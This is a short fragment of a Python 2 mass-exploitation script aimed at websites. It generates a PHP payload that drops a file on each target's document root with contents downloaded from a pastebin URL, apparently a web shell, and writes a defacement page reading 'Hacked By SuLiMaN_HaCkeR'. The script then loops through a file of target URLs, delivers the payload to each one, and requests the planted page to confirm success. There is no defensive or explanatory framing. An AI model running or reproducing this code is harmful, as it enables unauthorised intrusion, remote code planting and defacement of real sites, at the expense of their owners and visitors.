...
pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/min.php','w+'),file_get_contents('http://pastebin.com/raw/erWEmwib')); fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/ksa.html','w+'),'Hacked By SuLiMaN_HaCkeR');")
for i in fil.readlines():
  try:
    i=i.strip()
    print get_url(i, pl)
    lala=requests.get(i+"/ksa.html")
